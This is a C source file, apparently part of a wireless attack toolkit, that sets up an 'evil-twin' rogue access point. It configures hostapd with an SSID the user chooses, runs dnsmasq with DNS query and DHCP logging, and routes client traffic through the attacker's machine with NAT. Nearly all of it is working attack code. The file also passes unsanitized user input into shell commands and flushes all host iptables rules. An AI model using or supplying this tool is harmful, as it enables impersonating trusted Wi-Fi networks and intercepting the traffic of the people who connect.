#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <errno.h>

#define BUFFER_SIZE 2048
#define MAX_PROCESSES 5

// Structure to store process information
typedef struct {
    pid_t pid;
    int stdin_pipe[2];
    int stdout_pipe[2];
    char name[32];
    int active;
} Process;

// Global variables
Process processes[MAX_PROCESSES];
int process_count = 0;
char wireless_interface[16] = "";
char internet_interface[16] = "";

// Function prototypes
static void cleanup();
static void signal_handler(int sig);
static Process start_process(const char *command, const char *name);
static void stop_process(Process *proc);
static int read_process_output(Process *proc, char *buffer, int max_size);
static void start_access_point();
static void setup_dhcp_server();
static void setup_routing();
static void print_status();

void twin_ap_attack() 
{
    int choice;
    
    // Set up signal handler for cleanup on exit
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);
    
    // Get interface names
    printf("Enter your wireless interface name to be used as the evil-twin (e.g., wlan0): ");
    fgets(wireless_interface, sizeof(wireless_interface), stdin);
    wireless_interface[strcspn(wireless_interface, "\n")] = '\0'; // Remove newline
    
    printf("Enter your internet-connected interface (e.g., eth0): ");
    fgets(internet_interface, sizeof(internet_interface), stdin);
    internet_interface[strcspn(internet_interface, "\n")] = '\0'; // Remove newline
    
    // Main menu loop
    while (1) {
        printf("\nMain Menu:\n");
        printf("1. Start Twin AP\n");
        printf("2. Show status\n");
        printf("3. Exit\n");
        printf("Enter your choice: ");
        
        if (scanf("%d", &choice) != 1) {
            getchar(); // Clear input buffer
            printf("Invalid input. Please enter a number.\n");
            continue;
        }
        getchar(); // Consume newline
        
        switch (choice) {
            case 1:
                start_access_point();
                setup_dhcp_server();
                setup_routing();
                break;
            case 2:
                print_status();
                break;
            case 3:
                printf("Exiting and cleaning up...\n");
                cleanup();
                return;
                break;
            default:
                printf("Invalid choice. Please try again.\n");
        }
    }
    
    return;
}

// Signal handler for clean exit
static void signal_handler(int sig) 
{
    printf("\nReceived signal %d. Cleaning up...\n", sig);
    cleanup();
    exit(0);
}

// Clean up all processes and restore network settings
static void cleanup() 
{
    printf("Stopping all processes...\n");
    for (int i = 0; i < process_count; i++) {
        if (processes[i].active) {
            stop_process(&processes[i]);
        }
    }
    
    // Disable IP forwarding
    system("echo 0 > /proc/sys/net/ipv4/ip_forward");
    
    // Flush iptables rules
    system("iptables --flush");
    system("iptables --table nat --flush");
    system("iptables --delete-chain");
    system("iptables --table nat --delete-chain");
    
    // Restart NetworkManager
    char start_net_cmd[64];
    snprintf(start_net_cmd, sizeof(start_net_cmd), "nmcli device set %s managed yes", wireless_interface);
    printf("Startping NetworkManager...\n");
    system(start_net_cmd);
    
    printf("Cleanup complete. Exiting.\n");
}

// Start a new process with pipes for communication
static Process start_process(const char *command, const char *name) 
{
    Process proc;
    memset(&proc, 0, sizeof(Process));
    
    // Create pipes
    if (pipe(proc.stdin_pipe) < 0 || pipe(proc.stdout_pipe) < 0) {
        perror("Failed to create pipes");
        exit(1);
    }
    
    // Set non-blocking for read pipe
    int flags = fcntl(proc.stdout_pipe[0], F_GETFL, 0);
    fcntl(proc.stdout_pipe[0], F_SETFL, flags | O_NONBLOCK);
    
    // Fork a new process
    proc.pid = fork();
    
    if (proc.pid < 0) {
        perror("Fork failed");
        exit(1);
    } else if (proc.pid == 0) {
        // Child process
        
        // Close unused pipe ends
        close(proc.stdin_pipe[1]);
        close(proc.stdout_pipe[0]);
        
        // Redirect stdin and stdout
        dup2(proc.stdin_pipe[0], STDIN_FILENO);
        dup2(proc.stdout_pipe[1], STDOUT_FILENO);
        dup2(proc.stdout_pipe[1], STDERR_FILENO);
        
        // Close the original descriptors
        close(proc.stdin_pipe[0]);
        close(proc.stdout_pipe[1]);
        
        // Execute the command
        execl("/bin/sh", "sh", "-c", command, NULL);
        
        // If we get here, execl failed
        perror("execl failed");
        exit(1);
    }
    
    // Parent process
    
    // Close unused pipe ends
    close(proc.stdin_pipe[0]);
    close(proc.stdout_pipe[1]);
    
    // Store process info
    strncpy(proc.name, name, sizeof(proc.name) - 1);
    proc.active = 1;
    
    // Add to process list
    if (process_count < MAX_PROCESSES) {
        processes[process_count++] = proc;
    }
    
    printf("Started process: %s (PID: %d)\n", name, proc.pid);
    return proc;
}

// Stop a running process
static void stop_process(Process *proc) 
{
    if (!proc->active) return;
    
    printf("Stopping process: %s (PID: %d)\n", proc->name, proc->pid);
    
    // Send SIGTERM to the process
    kill(proc->pid, SIGTERM);
    
    // Close pipes
    close(proc->stdin_pipe[1]);
    close(proc->stdout_pipe[0]);
    
    // Wait for process to terminate (with timeout)
    int status;
    int retries = 5;
    while (retries > 0) {
        if (waitpid(proc->pid, &status, WNOHANG) != 0) break;
        usleep(100000); // 100ms
        retries--;
    }
    
    // If still alive, force kill
    if (retries == 0) {
        printf("Process %s not responding, sending SIGKILL\n", proc->name);
        kill(proc->pid, SIGKILL);
        waitpid(proc->pid, &status, 0);
    }
    
    proc->active = 0;
}

// Read output from a process
static int read_process_output(Process *proc, char *buffer, int max_size) 
{
    int total_bytes = 0;
    int bytes_read;
    
    memset(buffer, 0, max_size);
    
    // Try to read for up to 1 second
    int retries = 10;
    while (retries > 0) {
        bytes_read = read(proc->stdout_pipe[0], buffer + total_bytes, max_size - total_bytes - 1);
        
        if (bytes_read > 0) {
            total_bytes += bytes_read;
            if (total_bytes >= max_size - 1) break;
        } else if (bytes_read == 0 || (bytes_read == -1 && errno != EAGAIN)) {
            break;
        }
        
        usleep(100000); // 100ms
        retries--;
    }
    
    buffer[total_bytes] = '\0';
    return total_bytes;
}

// Start the wireless access point
static void start_access_point() 
{
    // Stop NetworkManager to prevent interference
    char stop_net_cmd[64];
    snprintf(stop_net_cmd, sizeof(stop_net_cmd), "nmcli device set %s managed no", wireless_interface);
    printf("Stopping NetworkManager...\n");
    system(stop_net_cmd);
    
    char command[256];
    char hostapd_conf[] = "/tmp/hostapd.conf";
    FILE *conf_file;
    char ssid[64];
    char channel[4];
    char password[64];
    int use_password = 0;
    
    // Get AP details
    printf("Enter SSID for the access point: ");
    fgets(ssid, sizeof(ssid), stdin);
    ssid[strcspn(ssid, "\n")] = '\0';
    
    printf("Enter channel number (1-11): ");
    fgets(channel, sizeof(channel), stdin);
    channel[strcspn(channel, "\n")] = '\0';
    
    printf("Do you want to secure the AP with a password? (y/n): ");
    char choice = getchar();
    getchar(); // Consume newline
    
    if (choice == 'y' || choice == 'Y') {
        use_password = 1;
        printf("Enter password (at least 8 characters): ");
        fgets(password, sizeof(password), stdin);
        password[strcspn(password, "\n")] = '\0';
    }
    
    // Create hostapd configuration file
    conf_file = fopen(hostapd_conf, "w");
    if (!conf_file) {
        perror("Failed to create hostapd config");
        return;
    }
    
    fprintf(conf_file, "interface=%s\n", wireless_interface);
    fprintf(conf_file, "driver=nl80211\n");
    fprintf(conf_file, "ssid=%s\n", ssid);
    fprintf(conf_file, "channel=%s\n", channel);
    fprintf(conf_file, "hw_mode=g\n");
    
    if (use_password) {
        fprintf(conf_file, "wpa=2\n");
        fprintf(conf_file, "wpa_passphrase=%s\n", password);
        fprintf(conf_file, "wpa_key_mgmt=WPA-PSK\n");
        fprintf(conf_file, "wpa_pairwise=CCMP\n");
        fprintf(conf_file, "rsn_pairwise=CCMP\n");
    } else {
        fprintf(conf_file, "auth_algs=1\n");
    }
    
    fclose(conf_file);
    
    // Configure interface with static IP
    snprintf(command, sizeof(command), "ifconfig %s 192.168.1.1 netmask 255.255.255.0", wireless_interface);
    printf("Setting static IP: %s\n", command);
    system(command);

    // Add route directly to wireless interface - corrected from problematic route command
    snprintf(command, sizeof(command), "ip route add 192.168.1.0/24 dev %s src 192.168.1.1", wireless_interface);
    system(command);
    
    sleep(1);
    
    // Start hostapd with our config
    snprintf(command, sizeof(command), "hostapd %s", hostapd_conf);
    printf("Starting access point: %s\n", command);
    
    Process proc = start_process(command, "hostapd");
    
    // Wait for hostapd to start
    sleep(2);
    char buffer[BUFFER_SIZE];
    read_process_output(&proc, buffer, BUFFER_SIZE);
    
    if (strstr(buffer, "AP-ENABLED") != NULL || strstr(buffer, "interface initialized") != NULL) {
        printf("Access point started successfully!\n");
    } else {
        printf("hostapd output: %s\n", buffer);
        printf("Note: Access point may still be starting. Check 'Show status' for updates.\n");
    }
}

// Setup DHCP server
static void setup_dhcp_server() 
{
    char command[256];
    char dnsmasq_conf[] = "/tmp/dnsmasq.conf";
    FILE *conf_file;
    
    // Create dnsmasq configuration
    conf_file = fopen(dnsmasq_conf, "w");
    if (!conf_file) {
        perror("Failed to create dnsmasq config");
        return;
    }
    
    fprintf(conf_file, "interface=%s\n", wireless_interface);
    fprintf(conf_file, "dhcp-range=192.168.1.10,192.168.1.100,255.255.255.0,8h\n");
    fprintf(conf_file, "dhcp-option=3,192.168.1.1\n");  // Default gateway
    fprintf(conf_file, "dhcp-option=6,8.8.8.8,8.8.4.4\n");  // DNS servers
    fprintf(conf_file, "log-queries\n");
    fprintf(conf_file, "log-dhcp\n");
    fclose(conf_file);
    
    // Stop any existing dnsmasq
    system("pkill dnsmasq");
    
    // Start dnsmasq
    snprintf(command, sizeof(command), "dnsmasq -C %s", dnsmasq_conf);
    printf("Starting DHCP server: %s\n", command);
    
    Process proc = start_process(command, "dnsmasq");
    
    // Wait for dnsmasq to start
    sleep(2);
    char buffer[BUFFER_SIZE];
    read_process_output(&proc, buffer, BUFFER_SIZE);
    
    if (buffer[0] != '\0') {
        printf("DHCP server output: %s\n", buffer);
    } else {
        printf("DHCP server started (no output - this is normal for dnsmasq)\n");
    }
}

// Setup routing for internet access
static void setup_routing() 
{
    // Enable IP forwarding
    printf("Enabling IP forwarding...\n");
    system("echo 1 > /proc/sys/net/ipv4/ip_forward");
    
    // Set up iptables for NAT
    printf("Setting up NAT rules...\n");
    
    char command[256];
    
    // Clear existing rules
    system("iptables -F");
    system("iptables -t nat -F");
    system("iptables -X");
    system("iptables -t nat -X");
    
    // Set up NAT
    snprintf(command, sizeof(command), 
             "iptables -t nat -A POSTROUTING -o %s -j MASQUERADE", 
             internet_interface);
    system(command);

    // Allow forwarding from wireless to internet
    snprintf(command, sizeof(command), 
             "iptables -A FORWARD -i %s -o %s -m state --state RELATED,ESTABLISHED -j ACCEPT", 
             internet_interface, wireless_interface);
    system(command);
    
    snprintf(command, sizeof(command), 
             "iptables -A FORWARD -i %s -o %s -j ACCEPT", 
             wireless_interface, internet_interface);
    system(command);
    
    // Ensure routing table is set properly
    snprintf(command, sizeof(command),
             "ip route add 192.168.1.0/24 dev %s src 192.168.1.1 table main", 
             wireless_interface);
    system(command);
    
    printf("Routing and internet sharing set up successfully\n");
    printf("Clients connected to the access point should now have internet access.\n");
}

// Print status of running processes
static void print_status() 
{
    printf("\n===== System Status =====\n");
    
    // Check if hostapd is running
    system("pgrep -a hostapd");
    
    // Check if dnsmasq is running
    system("pgrep -a dnsmasq");
    
    // Check IP forwarding status
    printf("\nIP Forwarding status: ");
    system("cat /proc/sys/net/ipv4/ip_forward");
    
    // Check interface configuration
    printf("\nWireless interface configuration:\n");
    char command[128];
    snprintf(command, sizeof(command), "ifconfig %s", wireless_interface);
    system(command);
    
    // Check for connected clients
    printf("\nConnected clients:\n");
    system("cat /var/lib/misc/dnsmasq.leases 2>/dev/null || echo 'No leases file found'");
    
    printf("\n");
}